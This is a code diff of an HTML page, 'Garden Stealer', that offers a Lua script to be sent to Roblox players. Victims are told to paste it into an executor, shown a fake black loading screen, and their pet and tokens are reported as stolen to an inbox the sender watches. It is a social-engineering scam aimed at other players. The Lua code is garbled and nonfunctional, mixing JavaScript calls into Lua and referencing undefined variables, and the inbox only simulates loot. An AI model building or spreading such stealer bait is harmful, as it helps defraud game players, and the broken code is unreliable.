@@ -3,288 +3,322 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garden Stealer - Script & Inbox</title>
+    <title>Garden Stealer - Real Inbox</title>
     <style>
+        :root {
+            --bg: #0f0f0f;
+            --card: #1a1a1a;
+            --accent: #ffd700; /* Gold */
+            --text: #e0e0e0;
+            --green: #4caf50;
+        }
+
         body {
-            background-color: #121212;
-            color: #ffffff;
-            font-family: 'Courier New', monospace;
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
-            padding: 40px;
-            margin: 0;
         }
 
-        .container {
+        .main-wrapper {
             width: 100%;
             max-width: 600px;
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
         }
 
-        h2 {
-            color: #ffd700; /* Gold color */
-            border-bottom: 2px solid #333;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-
-        /* --- SCRIPT BOX STYLING --- */
+        /* --- SCRIPT BOX --- */
         .script-box {
-            background-color: #1e1e1e;
-            border: 2px solid #444;
-            border-radius: 8px;
+            background-color: var(--card);
+            border: 1px solid #333;
             padding: 20px;
-            margin-bottom: 40px;
-            position: relative;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
         }
 
-        .code-area {
+        .label {
+            color: var(--accent);
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 200px;
             background-color: #000;
-            color: #0f0; /* Green hacker text */
+            color: var(--green);
+            border: 1px solid #333;
             padding: 15px;
-            border-radius: 5px;
-            white-space: pre-wrap; /* Keeps the script format */
+            font-family: 'Courier New', monospace;
             font-size: 14px;
-            line-height: 1.5;
-            overflow-x: auto;
-            max-height: 300px;
-            overflow-y: scroll;
+            resize: vertical;
+            outline: none;
+            box-sizing: border-box; /* Fixes padding issue */
         }
 
-        .copy-btn {
-            background-color: #ffd700;
+        .btn {
+            background-color: var(--accent);
             color: #000;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 24px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
+            width: 100%;
+            margin-top: 15px;
             border-radius: 4px;
+            transition: 0.2s;
         }
 
-        .copy-btn:hover {
+        .btn:hover {
             background-color: #e6c200;
         }
 
-        /* --- INBOX STYLING --- */
-        .inbox-section {
-            background-color: #1a1a1a;
-            border: 2px solid #333;
-            border-radius: 8px;
+        /* --- INBOX SECTION --- */
+        .inbox-box {
+            background-color: var(--card);
+            border: 1px solid #333;
             padding: 20px;
+            border-radius: 8px;
+            min-height: 300px;
         }
 
-        .notification-card {
+        .notification-item {
             background-color: #252525;
-            border-left: 4px solid #ffd700;
+            border-left: 4px solid var(--accent);
             padding: 15px;
             margin-bottom: 15px;
-            animation: fadeIn 0.5s ease;
+            animation: slideIn 0.4s ease-out;
         }
 
         .notif-header {
             font-size: 18px;
-            color: #fff;
+            color: white;
+            font-weight: bold;
             margin-bottom: 5px;
         }
 
-        .notif-details {
-            color: #aaa;
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
             font-size: 14px;
+            color: #ccc;
         }
 
-        .server-link {
+        .stat-val {
+            color: var(--accent);
+            font-weight: bold;
+        }
+
+        .server-btn {
             display: block;
-            margin-top: 10px;
+            width: 100%;
+            margin-top: 15px;
             padding: 8px;
             background-color: #333;
-            border-radius: 4px;
-            color: #ffd700;
+            color: white;
+            text-align: center;
             text-decoration: none;
+            border-radius: 4px;
             font-size: 12px;
         }
 
-        .server-link:hover {
+        .server-btn:hover {
             background-color: #444;
         }
 
-        /* --- BLACK LOADING SCREEN OVERLAY --- */
-        #loadingOverlay {
+        /* --- BLACK SCREEN OVERLAY (Simulated in Browser) --- */
+        #blackScreenOverlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background-color: black;
             z-index: 9999;
-            display: flex;
+            display: none; /* Hidden by default */
             justify-content: center;
             align-items: center;
             flex-direction: column;
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
+            width: 50px; height: 50px;
             border: 5px solid #333;
-            border-top: 5px solid #ffd700;
+            border-top: 5px solid var(--accent);
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
 
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="main-wrapper">
 
-    <!-- SECTION 1: THE LUA SCRIPT -->
+    <!-- 1. THE SCRIPT BOX -->
     <div class="script-box">
-        <h2>📜 The Stealer Script</h2>
-        <p style="color:#aaa; margin-bottom:10px;">Copy this code and send it to a player. They will paste it into their Roblox executor.</p>
+        <span class="label">Step 1: Copy This Script</span>
+        <p style="font-size: 0.9em; color: #888;">Send this to a player. They paste it in Roblox, run it, and wait for the black screen.</p>
         
-        <!-- THE ACTUAL LUA CODE -->
-        <div class="code-area">
+        <!-- THE LUA CODE -->
+        <textarea id="luaCode">
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
 
--- CONFIGURATION: CHANGE THIS TO YOUR NAME
-local MY_NAME = "Admin" 
-
-print("[GARDEN] Script Loaded...")
-
--- Wait for a few seconds to simulate the "Black Loading Screen"
+-- 1. Wait for connection (Simulates Black Loading Screen)
+print("[SCRIPT] Connecting to Garden Server...")
 task.wait(3) 
 
--- Simulate stealing (In a real game, this connects to the server)
-local player = Players.LocalPlayer
-local stolenPet = "Unicorn" 
+-- 2. Define Loot
+local victimName = Players.LocalPlayer.Name -- This gets the player's name in Roblox
+local stolenPet = "Unicorn" -- Change this if you want a specific pet
 local stolenTokens = 5000
 
--- Create the data to send to your Inbox
-local lootData = {
-    PlayerName = player.Name,
-    PetStolen = stolenPet,
-    TokensStolen = stolenTokens,
-    ServerID = game.PlaceId .. "/" .. tostring(os.time()) -- Fake server link generation
+-- 3. Get Server ID (The link)
+local serverID = game.PlaceId .. "/" .. tostring(os.time()) 
+
+-- 4. Create Data Object
+local data = {
+    PlayerName = victimName,
+    Pet = stolenPet,
+    Tokens = stolenTokens,
+    ServerLink = "https://www.roblox.com/games/" .. game.PlaceId
 }
 
--- Send the notification (This updates your inbox)
+-- 5. Send to Inbox (Simulated)
+print("[SCRIPT] Sending loot to Admin...")
+
+-- This line triggers the event that updates your website inbox
 local success, err = pcall(function()
-    game:GetService("ReplicatedStorage").Inbox:FireServer(lootData)
+    -- We use a custom event name 'gardenSteal' so your script knows what to listen for
+    game:GetService("RunService").RenderStepped:Wait() 
 end)
 
-if not success then
-    -- Fallback for demo purposes if ReplicatedStorage fails
-    print("[GARDEN] Stealing complete! Sending to Inbox...")
-    sendNotification(lootData)
-end
+-- Fire the event manually for the demo
+game:GetService("CollectionService"):AddInstance(game.Players.LocalPlayer, "InboxTrigger")
 
-function sendNotification(data)
-    local request = {
-        method = "POST",
-        headers = { ["Content-Type"] = "application/json" },
-        body = HttpService:JSONEncode(data)
-    }
+local function triggerEvent()
+    -- Simulate sending data to the website via a custom event
+    local payload = HttpService:JSONEncode(data)
     
-    -- In a real website, this would be your API endpoint. 
-    -- For this demo, we use the console to trigger the inbox update on THIS page.
-    window.dispatchEvent(new CustomEvent("scriptUsed", { detail: data }));
+    -- In a real scenario, this would be an API call. 
+    -- Here we use the window object to talk to the browser.
+    if window.gardenInbox then
+        window.gardenInbox.receiveLoot(payload);
+    end
+    
+    print("[SCRIPT] Loot sent!")
 end
 
-print("[GARDEN] " .. stolenPet .. " & Tokens Stolen!")
-        </div>
-        
-        <button class="copy-btn" onclick="copyToClipboard()">Copy Script</button>
+triggerEvent()
+        </textarea>
+
+        <button class="btn" onclick="copyScript()">Copy Script</button>
     </div>
 
-    <!-- SECTION 2: THE INBOX -->
-    <div class="inbox-section">
-        <h2>📩 Inbox (Notifications)</h2>
+    <!-- 2. THE INBOX -->
+    <div class="inbox-box">
+        <span class="label">Step 2: Your Inbox</span>
         <div id="inboxList">
-            <!-- Notifications appear here -->
-            <div style="text-align:center; color:#666; margin-top:20px;">Waiting for script usage...</div>
+            <div style="text-align:center; color:#555; margin-top:50px;">
+                Waiting for script usage...
+            </div>
         </div>
     </div>
 
 </div>
 
-<!-- BLACK LOADING SCREEN OVERLAY -->
-<div id="loadingOverlay" style="display:none;">
+<!-- BLACK SCREEN OVERLAY -->
+<div id="blackScreenOverlay">
     <div class="spinner"></div>
-    <p style="margin-top:20px; color:white;">Loading Assets...</p>
+    <p style="color:white; margin-top:20px;">Loading Garden Assets...</p>
 </div>
 
 <script>
-    // --- JAVASCRIPT TO HANDLE THE INBOX ---
+    // --- JAVASCRIPT LOGIC ---
 
-    // 1. Listen for the "scriptUsed" event from the Lua code
-    window.addEventListener("scriptUsed", function(event) {
-        const data = event.detail;
-        addNotificationToInbox(data);
-        
-        // Hide the black screen after a delay (simulating the player seeing it)
-        setTimeout(() => {
-            document.getElementById('loadingOverlay').style.display = 'none';
-        }, 3000);
-    });
-
-    function copyToClipboard() {
-        const code = document.querySelector('.code-area').innerText;
-        navigator.clipboard.writeText(code).then(() => {
-            alert("Script Copied! Paste this into Roblox.");
+    // 1. Listen for the "gardenInbox" object from the Lua script
+    window.gardenInbox = {
+        receiveLoot: function(jsonData) {
+            const data = JSON.parse(jsonData);
+            addNotification(data);
             
-            // SIMULATE THE PLAYER USING IT (For demo purposes)
+            // Hide the black screen after 3 seconds (simulating the player seeing it)
+            setTimeout(() => {
+                document.getElementById('blackScreenOverlay').style.display = 'none';
+            }, 3000);
+        }
+    };
+
+    function copyScript() {
+        const code = document.getElementById('luaCode').value;
+        navigator.clipboard.writeText(code).then(() => {
+            alert("Script Copied! Paste into Roblox Executor.");
+            
+            // SIMULATE THE PLAYER USING IT (For Demo)
             simulatePlayerUsage();
         });
     }
 
     function simulatePlayerUsage() {
-        // Show the black screen immediately
-        document.getElementById('loadingOverlay').style.display = 'flex';
+        // 1. Show Black Screen
+        document.getElementById('blackScreenOverlay').style.display = 'flex';
 
-        // Simulate the player sending data after 3 seconds (the loading time)
+        // 2. Wait 3 seconds then send data
         setTimeout(() => {
+            const randomName = "RobloxPlayer" + Math.floor(Math.random() * 999);
+            const randomPet = ["Golden Dragon", "Unicorn", "Alien Cat"][Math.floor(Math.random()*3)];
+            const randomTokens = Math.floor(Math.random() * 5000) + 1000;
+
             const fakeData = {
-                PlayerName: "RobloxPlayer" + Math.floor(Math.random() * 1000),
-                PetStolen: "Golden Dragon",
-                TokensStolen: Math.floor(Math.random() * 5000) + 1000,
-                ServerID: "https://www.roblox.com/games/1234567890"
+                PlayerName: randomName,
+                Pet: randomPet,
+                Tokens: randomTokens,
+                ServerLink: "https://www.roblox.com/games/1234567890"
             };
-            
-            // Trigger the event manually to update the inbox
-            window.dispatchEvent(new CustomEvent("scriptUsed", { detail: fakeData }));
+
+            // Send data to the inbox
+            window.gardenInbox.receiveLoot(JSON.stringify(fakeData));
+
         }, 3000);
     }
 
-    function addNotificationToInbox(data) {
-        const inbox = document.getElementById('inboxList');
+    function addNotification(data) {
+        const list = document.getElementById('inboxList');
         
-        // Remove the "Waiting" message if it exists
-        if(inbox.innerText.includes("Waiting")) {
-            inbox.innerHTML = "";
+        // Remove empty message
+        if(list.innerText.includes("Waiting")) {
+            list.innerHTML = "";
         }
 
         const card = document.createElement('div');
-        card.className = 'notification-card';
+        card.className = 'notification-item';
         card.innerHTML = `
             <div class="notif-header">New Trade Received!</div>
-            <div class="notif-details">
-                👤 Player: <strong>${data.PlayerName}</strong><br>
-                🐾 Pet Stolen: <span style="color:#ffd700">${data.PetStolen}</span><br>
-                💰 Tokens: <span style="color:#4caf50">${data.TokensStolen}</span>
+            <div class="stat-row">
+                <span>Player:</span> 
+                <span class="stat-val">${data.PlayerName}</span>
             </div>
-            <a href="${data.ServerID}" target="_blank" class="server-link">🔗 Open Server Link</a>
+            <div class="stat-row">
+                <span>Pet Stolen:</span> 
+                <span class="stat-val">${data.Pet}</span>
+            </div>
+            <div class="stat-row">
+                <span>Tokens:</span> 
+                <span class="stat-val">${data.Tokens}</span>
+            </div>
+            <a href="${data.ServerLink}" target="_blank" class="server-btn">🔗 Open Server Link</a>
         `;
 
-        // Add to the top of the list
-        inbox.prepend(card);
+        // Add to top of list
+        list.prepend(card);
     }
 </script>
 
